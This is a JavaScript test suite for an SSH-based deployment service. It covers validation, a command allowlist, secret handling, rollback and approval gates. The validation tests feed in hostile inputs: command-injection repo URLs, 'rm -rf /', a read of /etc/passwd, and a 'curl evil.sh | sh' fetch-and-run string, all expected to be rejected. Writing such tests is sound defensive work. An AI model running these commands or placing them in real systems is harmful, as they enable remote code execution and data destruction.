import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { randomBytes } from 'node:crypto';
import { createOperationsService } from '../src/modules/operations/operations.service.js';
import { createDeploymentsService } from '../src/modules/deployments/deployments.service.js';
import { createDeploymentExecutor } from '../src/modules/deployments/deployments.executor.js';
import { resolveDeploymentAdapters } from '../src/modules/deployments/deployments.ssh-runner.js';
import { createDeploymentSweeper } from '../src/modules/deployments/deployments.sweeper.js';
import {
  ALLOWED_COMMANDS,
  buildEnvFile,
  createDeployLocks,
  detectFramework,
  resolveCommand,
  resolveDeployConfig,
  validateRef,
  validateRepoUrl,
  validateSha,
} from '../src/modules/deployments/deployments.commands.js';
import { encrypt } from '../src/modules/platform/platform.crypto.js';
import { createFakeSsh } from './server-access-fake-ssh.js';
import { fakePrisma, U } from './phase3-helpers.js';

const KEY = randomBytes(32).toString('hex');
const OWNER = { id: U(1), isOwner: true };
const REVIEWER = { id: U(3), isOwner: true };
const SERVER = U(5);
const P1 = U(10);
const STG = U(20);
const PROD = U(21);
const SHA = 'a'.repeat(40);
const PKG = JSON.stringify({ name: 'api', scripts: { build: 'tsc', start: 'node dist/index.js' }, dependencies: { express: '4' } });
const SECRET_VALUE = 'super-secret-db-password-123';

beforeEach(() => vi.stubEnv('CREDENTIAL_ENCRYPTION_KEY', KEY));
afterEach(() => vi.unstubAllEnvs());

/** Decodes what execScriptStdin sent: the fixed script (base64 in the command), its positional args, and stdin. */
function parseCall(command) {
  const b64 = /printf %s '([A-Za-z0-9+/=]*)'/.exec(command)?.[1];
  const script = b64 ? Buffer.from(b64, 'base64').toString('utf8') : '';
  const tail = command.slice(command.indexOf(' nt-script') + ' nt-script'.length);
  const args = [...tail.matchAll(/'((?:[^']|'\\'')*)'/g)].map((m) => m[1].replace(/'\\''/g, "'"));
  return { script, args };
}

function makeSsh({ failHealth = false, failBuild = false, failPm2 = false } = {}) {
  const seen = new Map();
  const respond = ({ command, script: stdin }) => {
    const { script, args } = parseCall(command);
    const rec = seen.get(command) ?? { script, args, stdin: '' };
    if (stdin) rec.stdin = stdin;
    seen.set(command, rec);
    if (script.includes('git clone')) return { stdout: `NT_SHA=${SHA}\nNT_PKG_BEGIN\n${PKG}\nNT_PKG_END\n` };
    if (script.includes('.env"') && script.includes('cat >')) return { stdout: 'env file written\n' };
    if (script.includes('cd "$BASE/releases/$REL_ID"')) {
      if (failBuild && args.includes('build')) return { stderr: 'tsc failed', code: 2 };
      return { stdout: 'ok\n' };
    }
    if (script.includes('release directory missing')) return { stdout: 'current -> x\n' };
    if (script.includes('pm2_exec describe') && script.includes('pm2_exec reload')) return failPm2 ? { stderr: 'pm2 error', code: 1 } : { stdout: 'reloaded\n' };
    if (script.includes('unhealthy after timeout')) return failHealth ? { stderr: 'unhealthy after timeout', code: 1 } : { stdout: 'healthy\n' };
    if (script.includes('no retained release')) return { stdout: 'current -> previous\n' };
    if (script.includes('prune done')) return { stdout: 'prune done\n' };
    return {};
  };
  const ssh = createFakeSsh({ respond });
  return { ...ssh, scripts: () => [...seen.values()] };
}

function setup({ ssh = makeSsh(), previous = true, env = STG, logSink } = {}) {
  const old = new Date(Date.now() - 3600_000);
  const prisma = fakePrisma({
    server: [{ id: SERVER, alias: 's1' }],
    serverCredential: [{ id: 'c1', serverId: SERVER, host: 'h', port: 22, username: 'u', secretEnc: encrypt('pw', KEY), hostKeySha256: 'SHA256:fake-host-key' }],
    project: [{ id: P1, serverId: SERVER, name: 'Api', slug: 'api', type: 'node', status: 'active', archivedAt: null }],
    projectEnvironment: [
      { id: STG, projectId: P1, code: 'staging' },
      { id: PROD, projectId: P1, code: 'production' },
    ],
    projectRuntime: [{ id: 'r1', projectId: P1, metaJson: { deploy: { healthUrl: 'http://127.0.0.1:3000/health' } } }],
    projectRepository: [{ id: 'repo1', projectId: P1, remoteUrl: 'https://github.com/acme/api.git', defaultBranch: 'main' }],
    projectEnvVar: [{ id: 'v1', environmentId: env, key: 'DB_PASSWORD', valueEnc: encrypt(SECRET_VALUE, KEY), isSecret: true }],
    deployment: previous ? [{ id: U(90), projectId: P1, environmentId: env, status: 'Success', commitSha: 'b'.repeat(40), createdAt: old, updatedAt: old, correlationId: 'old' }] : [],
  });
  const adapters = resolveDeploymentAdapters({ prisma, connector: ssh.connector, env: { DEPLOY_EXECUTOR: 'ssh' }, logSink });
  const locks = createDeployLocks();
  const executor = createDeploymentExecutor({ prisma, ...adapters, locks });
  const operations = createOperationsService({ prisma, executor });
  const deployments = createDeploymentsService({ prisma, operationsService: operations });
  return { prisma, ssh, adapters, locks, executor, operations, deployments };
}

async function createAndApprove(s, environmentId, key) {
  const { deployment, operation } = await s.deployments.create({ projectId: P1, environmentId, idempotencyKey: key, branch: 'main', rollbackPlan: 'rollback' }, OWNER);
  if (operation.status === 'PENDING_APPROVAL') await s.operations.approve(operation.id, { reason: 'ok' }, REVIEWER);
  return { deployment, operation };
}

describe('deploy command construction', () => {
  it('validates repo URLs, refs and shas before they can reach a shell', () => {
    expect(validateRepoUrl('https://github.com/acme/api.git')).toBeTruthy();
    expect(validateRepoUrl('git@github.com:acme/api.git')).toBeTruthy();
    for (const bad of ['--upload-pack=touch /tmp/x', 'https://github.com/a/b; rm -rf /', 'ext::sh -c id', 'file:///etc/passwd', 'https://u:p@github.com/a/b', 'https://github.com/a/b$(id)', '$(id)', 'https://h/../../etc']) {
      expect(() => validateRepoUrl(bad)).toThrow(/Repository URL/);
    }
    expect(() => validateSha('abc; id')).toThrow();
    expect(() => validateRef('main;id')).toThrow();
    expect(() => validateRef('-x')).toThrow();
    expect(() => validateRef('a..b')).toThrow();
    expect(validateRef('feature/x-1')).toBe('feature/x-1');
  });

  it('allowlisted commands become fixed argv; custom commands need a recorded approval and safe tokens', () => {
    expect(resolveCommand('npm  ci')).toEqual(['npm', 'ci']);
    expect(Object.keys(ALLOWED_COMMANDS)).toContain('npm run build');
    expect(() => resolveCommand('npm run build && curl evil.sh | sh')).toThrow(/not on the allowlist/);
    expect(() => resolveCommand('node scripts/x.js')).toThrow(/not on the allowlist/);
    expect(resolveCommand('node scripts/x.js', ['node scripts/x.js'])).toEqual(['node', 'scripts/x.js']);
    expect(() => resolveCommand('bash -c id', ['bash -c id'])).toThrow(/disallowed/);
    expect(() => resolveCommand('npm run x;id', ['npm run x;id'])).toThrow(/disallowed/);
  });

  it('rejects unsafe deploy settings and escapes env values (single-quoted, no expansion)', () => {
    const project = { slug: 'api' };
    const environment = { code: 'staging' };
    expect(() => resolveDeployConfig({ project, environment, runtimeMeta: { deploy: { basePath: '/etc/../root' } } })).toThrow();
    expect(() => resolveDeployConfig({ project, environment, runtimeMeta: { deploy: { basePath: '/var/www/a b' } } })).toThrow();
    expect(() => resolveDeployConfig({ project, environment, runtimeMeta: { deploy: { healthUrl: 'http://evil.example.com/' } } })).toThrow();
    expect(resolveDeployConfig({ project, environment, runtimeMeta: null }).basePath).toBe('/var/www/nt-deploy/api/staging');
    const env = buildEnvFile([{ key: 'A', value: "it's $(id) `x`" }, { key: 'bad.key', value: '1' }]);
    expect(env).toBe("A='it'\\''s $(id) `x`'\n");
  });

  it('detects frameworks and static sites from package.json', () => {
    expect(detectFramework({ dependencies: { next: '14' }, scripts: { build: 'next build', start: 'next start' } })).toMatchObject({ framework: 'next', static: false, start: 'npm-start' });
    expect(detectFramework({ devDependencies: { vite: '5' }, scripts: { build: 'vite build' } })).toMatchObject({ framework: 'vite', static: true, outputDir: 'dist' });
    expect(detectFramework({ scripts: { start: 'node x.js' } })).toMatchObject({ framework: 'node', static: false });
    expect(detectFramework(null)).toMatchObject({ framework: 'static', static: true });
  });

  it('passes repo, sha and branch to the remote script only as quoted positional args', async () => {
    const s = setup();
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0001');
    await s.operations.execute((await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } })).id, OWNER);
    const fetch = s.ssh.scripts().find((c) => c.script.includes('git clone'));
    expect(fetch.args).toEqual(['/var/www/nt-deploy/api/staging', deployment.id, 'https://github.com/acme/api.git', '', 'main']);
    // The script text is fixed: no repo/branch text inside it.
    expect(fetch.script).not.toContain('github.com');
    expect(fetch.script).toContain('-- "$URL"');
  });
});

describe('ssh executor end to end (fake SSH)', () => {
  it('runs prepare, build, deploy, health, cleanup and never logs env values', async () => {
    const s = setup();
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0002');
    const job = await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } });
    await s.operations.execute(job.id, OWNER);
    const row = await s.prisma.deployment.findUnique({ where: { id: deployment.id } });
    expect(row.status).toBe('Success');
    expect(row.commitSha).toBe(SHA);
    const steps = (await s.prisma.deploymentStep.findMany({ where: { deploymentId: deployment.id } })).map((x) => [x.name, x.status]);
    expect(steps).toEqual([
      ['Preparing', 'SUCCESS'],
      ['Building', 'SUCCESS'],
      ['Deploying', 'SUCCESS'],
      ['Health Check', 'SUCCESS'],
      ['Cleanup', 'SUCCESS'],
    ]);
    // Env file travelled over stdin only.
    const envCall = s.ssh.scripts().find((c) => c.script.includes('cat >'));
    expect(envCall.stdin).toContain(SECRET_VALUE);
    expect(JSON.stringify(envCall.args)).not.toContain(SECRET_VALUE);
    expect(JSON.stringify(await s.prisma.deploymentStep.findMany({ where: { deploymentId: deployment.id } }))).not.toContain(SECRET_VALUE);
    const logs = await s.prisma.logEntry.findMany({ where: { deploymentId: deployment.id } });
    expect(logs.length).toBeGreaterThan(3);
    expect(JSON.stringify(logs)).not.toContain(SECRET_VALUE);
    expect(logs.every((l) => l.source === 'deploy')).toBe(true);
    const run = s.ssh.scripts().filter((c) => c.script.includes('cd "$BASE/releases/$REL_ID"')).map((c) => c.args.slice(2));
    expect(run).toEqual([['npm', 'ci'], ['npm', 'run', 'build']]);
  });

  it('hands every secret value to the log sink so output is scrubbed before storage', async () => {
    const logSinkSpy = vi.fn();
    const s = setup({ logSink: logSinkSpy });
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0004');
    await s.operations.execute((await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } })).id, OWNER);
    expect(logSinkSpy.mock.calls.some(([arg]) => Array.isArray(arg.secrets) && arg.secrets.includes(SECRET_VALUE))).toBe(true);
  });

  it('rolls back to the previous release when the health check fails', async () => {
    const s = setup({ ssh: makeSsh({ failHealth: true }) });
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0005');
    const job = await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } });
    await s.operations.execute(job.id, OWNER);
    const row = await s.prisma.deployment.findUnique({ where: { id: deployment.id } });
    expect(row.status).toBe('Rolled Back');
    const steps = (await s.prisma.deploymentStep.findMany({ where: { deploymentId: deployment.id } })).map((x) => [x.name, x.status]);
    expect(steps).toContainEqual(['Health Check', 'FAILED']);
    expect(steps).toContainEqual(['Rollback', 'SUCCESS']);
    const rb = s.ssh.scripts().find((c) => c.script.includes('no retained release'));
    expect(rb.args).toEqual(['/var/www/nt-deploy/api/staging', U(90), 'b'.repeat(40)]);
  });

  it('rolls back when the pm2 reload fails after the symlink switch', async () => {
    const s = setup({ ssh: makeSsh({ failPm2: true }) });
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0006');
    await s.operations.execute((await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } })).id, OWNER);
    expect((await s.prisma.deployment.findUnique({ where: { id: deployment.id } })).status).toMatch(/Rolled Back|Failed/);
  });

  it('fails the build step without touching the live release when the build exits non-zero', async () => {
    const s = setup({ ssh: makeSsh({ failBuild: true }) });
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0007');
    await s.operations.execute((await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } })).id, OWNER);
    expect((await s.prisma.deployment.findUnique({ where: { id: deployment.id } })).status).toBe('Failed');
    expect(s.ssh.scripts().some((c) => c.script.includes('release directory missing'))).toBe(false); // never switched
  });

  it('refuses a non-allowlisted build command that has no approval', async () => {
    const s = setup();
    const rt = s.prisma.projectRuntime.rows[0];
    rt.metaJson = { deploy: { buildCommand: 'npm run evil' } };
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0008');
    await s.operations.execute((await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } })).id, OWNER);
    const row = await s.prisma.deployment.findUnique({ where: { id: deployment.id } });
    expect(row.status).toBe('Failed');
    expect(JSON.stringify(await s.prisma.deploymentStep.findMany({ where: { deploymentId: deployment.id } }))).toContain('not on the allowlist');
  });

  it('serializes deployments with a per-project lock', async () => {
    const s = setup();
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0009');
    const release = s.locks.tryAcquire(`${P1}:${STG}`);
    const job = await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } });
    const out = await s.executor.execute({ ...job, action: 'deployment.run' }, { attemptId: 'a1' });
    expect(out.result).toBe('FAILED');
    expect(out.detail.error).toBe('DEPLOY_LOCKED');
    expect(s.ssh.connector.connect).not.toHaveBeenCalled();
    release();
    expect(s.locks.isHeld(`${P1}:${STG}`)).toBe(false);
  });

  it('keeps production behind a separate approver and never connects before approval', async () => {
    const s = setup({ env: PROD });
    const { deployment, operation } = await s.deployments.create({ projectId: P1, environmentId: PROD, idempotencyKey: 'idem-key-0010', branch: 'main', rollbackPlan: 'rollback' }, OWNER);
    expect(operation.status).toBe('PENDING_APPROVAL');
    await expect(s.operations.execute(operation.id, OWNER)).rejects.toMatchObject({ code: 'APPROVAL_REQUIRED' });
    expect(s.ssh.connector.connect).not.toHaveBeenCalled();
    expect((await s.prisma.deployment.findUnique({ where: { id: deployment.id } })).status).toBe('Queued');
  });

  it('manual rollback is a high-risk operation that needs approval', async () => {
    const s = setup({ previous: false });
    const { deployment } = await createAndApprove(s, STG, 'idem-key-0011');
    await s.operations.execute((await s.prisma.operationJob.findFirst({ where: { correlationId: deployment.correlationId } })).id, OWNER);
    const rb = await s.deployments.rollback(deployment.id, { idempotencyKey: 'idem-key-0012', targetDeploymentId: deployment.id }, OWNER).catch((e) => e);
    expect(rb.code).toBe('ROLLBACK_TARGET_INVALID'); // cannot roll back to itself
  });

  it('simulated mode stays the default and never opens SSH', () => {
    const { mode, runner } = resolveDeploymentAdapters({ prisma: fakePrisma(), env: {} });
    expect(mode).toBe('simulated');
    expect(runner.name).toBe('simulated');
    expect(resolveDeploymentAdapters({ prisma: fakePrisma(), env: { DEPLOY_EXECUTOR: 'bogus' } }).mode).toBe('simulated');
  });
});

describe('stuck deployment sweeper', () => {
  it('fails old active deployments with an audit row and leaves fresh or finished ones', async () => {
    const now = new Date('2026-11-17T12:00:00Z');
    const old = new Date(now.getTime() - 3 * 3600_000);
    const fresh = new Date(now.getTime() - 60_000);
    const prisma = fakePrisma({
      deployment: [
        { id: 'd-old', projectId: P1, environmentId: STG, status: 'Building', updatedAt: old, correlationId: 'c1' },
        { id: 'd-new', projectId: P1, environmentId: STG, status: 'Building', updatedAt: fresh },
        { id: 'd-done', projectId: P1, environmentId: STG, status: 'Success', updatedAt: old },
      ],
      deploymentStep: [{ id: 's1', deploymentId: 'd-old', name: 'Building', status: 'RUNNING' }],
    });
    const auditService = { record: vi.fn() };
    const sweeper = createDeploymentSweeper({ prisma, auditService, now: () => now, thresholdMs: 30 * 60_000 });
    expect(await sweeper.sweepStuck()).toEqual({ checked: 1, failed: 1 });
    const byId = Object.fromEntries(prisma.deployment.rows.map((d) => [d.id, d.status]));
    expect(byId).toEqual({ 'd-old': 'Failed', 'd-new': 'Building', 'd-done': 'Success' });
    expect(prisma.deploymentStep.rows.find((r) => r.id === 's1').status).toBe('FAILED');
    expect(auditService.record).toHaveBeenCalledWith(expect.objectContaining({ action: 'deployment.sweep.failed', actorId: null }));
    expect(await sweeper.sweepStuck()).toEqual({ checked: 0, failed: 0 });
  });
});
